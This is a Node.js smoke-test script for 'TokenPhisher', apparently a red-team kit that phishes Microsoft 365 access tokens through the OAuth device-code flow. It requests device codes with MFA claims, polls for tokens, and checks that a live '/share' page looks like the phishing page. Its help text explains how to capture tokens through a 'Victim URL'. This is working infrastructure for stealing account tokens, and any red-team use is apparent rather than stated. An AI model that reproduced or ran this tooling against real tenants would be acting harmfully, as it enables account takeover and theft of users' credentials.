#!/usr/bin/env node

import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { parseArgs } from 'util';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const CONFIG_JSON = path.join(__dirname, 'config.json');

const COMMON_ENDPOINTS = {
  tokenUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
  deviceCodeUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
};

function pass(label, detail = '') {
  console.log(`  ✓ ${label}${detail ? ` — ${detail}` : ''}`);
}

function fail(label, detail = '') {
  console.log(`  ✗ ${label}${detail ? ` — ${detail}` : ''}`);
}

function loadConfig(configPath) {
  if (!fs.existsSync(configPath)) {
    throw new Error(`Config not found: ${configPath}. Run npm run setup first.`);
  }
  return JSON.parse(fs.readFileSync(configPath, 'utf8'));
}

function resolveCertPath(certPath) {
  return path.isAbsolute(certPath) ? certPath : path.join(__dirname, certPath);
}

function checkTlsFiles(config) {
  if (config.testMode) {
    pass('TLS skipped (testMode is true)');
    return true;
  }

  let ok = true;
  for (const key of ['keyFilePath', 'certFilePath']) {
    const filePath = resolveCertPath(config[key]);
    if (fs.existsSync(filePath)) {
      pass(`Certificate file exists`, filePath);
    } else {
      fail(`Missing certificate file`, filePath);
      ok = false;
    }
  }
  return ok;
}

async function fetchOpenId(tenant) {
  const url = `https://login.microsoftonline.com/${encodeURIComponent(tenant)}/v2.0/.well-known/openid-configuration`;
  const response = await fetch(url);
  if (!response.ok) {
    throw new Error(`OpenID discovery failed (${response.status}) for ${tenant}`);
  }
  return response.json();
}

async function requestDeviceCode(config) {
  const body = new URLSearchParams({
    client_id: config.clientId,
    scope: config.scopes,
    claims: '{"access_token": {"amr": {"values": ["ngcmfa", "mfa"]}}}',
  });

  const response = await fetch(config.deviceCodeUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': config.userAgent,
    },
    body,
  });

  const text = await response.text();
  let data;
  try {
    data = JSON.parse(text);
  } catch {
    throw new Error(`Device code response was not JSON (${response.status}): ${text.slice(0, 200)}`);
  }

  if (!response.ok) {
    throw new Error(data.error_description || data.error || `HTTP ${response.status}`);
  }

  if (!data.user_code || !data.device_code) {
    throw new Error('Device code response missing user_code or device_code');
  }

  return data;
}

async function pollOnce(config, deviceCode) {
  const body = new URLSearchParams({
    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
    client_id: config.clientId,
    code: deviceCode,
  });

  const response = await fetch(config.tokenUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': config.userAgent,
    },
    body,
  });

  return response.json();
}

async function checkLiveUrl(url) {
  const response = await fetch(url, { redirect: 'manual' });
  const html = await response.text();

  if (response.status !== 200) {
    throw new Error(`Expected HTTP 200, got ${response.status}`);
  }
  if (!html.includes('user_code') && !html.includes('readonly')) {
    throw new Error('Response does not look like the phishing page (no code field found)');
  }
}

function printHelp() {
  console.log(`TokenPhisher smoke test

Usage:
  node smoke-test.mjs [options]

Options:
  --config <file>     Config file (default: ./config.json)
  --tenant <tenant>   Override tenant for OpenID check (common, organizations, or yourtenant.onmicrosoft.com)
  --use-common        Use Microsoft /common/ endpoints for device-code test (any work tenant account)
  --live-url <url>    Also fetch a running /share page (server must be up)
  --help              Show this help

Examples:
  npm run smoke-test
  npm run smoke-test -- --use-common
  npm run smoke-test -- --tenant contoso.onmicrosoft.com
  npm run smoke-test -- --live-url https://share.example.com/share

Testing without the client's tenant:
  • --use-common uses generic endpoints; sign in with any Azure AD work account you control.
  • Free M365 developer tenant: https://developer.microsoft.com/microsoft-365/dev-program
    gives you *.onmicrosoft.com — run setup with --tenant yourtenant.onmicrosoft.com
`);
}

async function main() {
  const { values } = parseArgs({
    options: {
      config: { type: 'string', default: CONFIG_JSON },
      tenant: { type: 'string' },
      'use-common': { type: 'boolean', default: false },
      'live-url': { type: 'string' },
      help: { type: 'boolean', short: 'h', default: false },
    },
    allowPositionals: false,
  });

  if (values.help) {
    printHelp();
    return;
  }

  console.log('TokenPhisher smoke test\n');

  const config = loadConfig(path.resolve(values.config));
  pass('Loaded config', values.config);

  if (values['use-common']) {
    Object.assign(config, COMMON_ENDPOINTS);
    pass('Using /common/ OAuth endpoints (not client-tenant-specific)');
  }

  if (values.tenant) {
    console.log('\nOpenID discovery:');
    const discovery = await fetchOpenId(values.tenant);
    pass(`Tenant "${values.tenant}" reachable`);
    console.log(`    tokenUrl: ${discovery.token_endpoint}`);
    console.log(`    deviceCodeUrl: ${discovery.device_authorization_endpoint}`);
    if (!values['use-common']) {
      config.tokenUrl = discovery.token_endpoint;
      config.deviceCodeUrl = discovery.device_authorization_endpoint;
    }
  } else if (config.microsoftTenant) {
    pass('Config tenant', config.microsoftTenant);
  }

  console.log('\nTLS files:');
  const tlsOk = checkTlsFiles(config);

  console.log('\nOAuth device-code flow:');
  console.log(`    deviceCodeUrl: ${config.deviceCodeUrl}`);
  const device = await requestDeviceCode(config);
  pass('Device code issued', `user_code=${device.user_code}`);

  const poll = await pollOnce(config, device.device_code);
  if (poll.error === 'authorization_pending') {
    pass('Token polling works', 'authorization_pending (expected before login)');
  } else if (poll.access_token) {
    pass('Token polling works', 'access_token returned (already authenticated?)');
  } else {
    fail('Unexpected poll response', JSON.stringify(poll));
  }

  if (values['live-url']) {
    console.log('\nLive page check:');
    await checkLiveUrl(values['live-url']);
    pass('Live /share page reachable', values['live-url']);
  }

  console.log('\nSmoke test complete.');
  if (!tlsOk) {
    console.log('Fix TLS issues above before production use.');
    process.exit(1);
  }

  console.log('\nTo test a full capture yourself:');
  if (values['use-common'] || config.deviceCodeUrl.includes('/common/')) {
    console.log('  1. npm run setup -- --test-mode --tenant common   (or your .onmicrosoft.com tenant)');
    console.log('  2. npm start');
    console.log('  3. Visit /share and complete login with an account you control');
  } else {
    console.log('  1. Visit your Victim URL /share');
    console.log('  2. Complete login at microsoft.com/devicelogin with a user in that tenant');
    console.log('  3. Or re-run setup with --tenant common / your dev tenant for self-testing');
  }
}

main().catch((error) => {
  console.error(`\nSmoke test failed: ${error.message}`);
  process.exit(1);
});
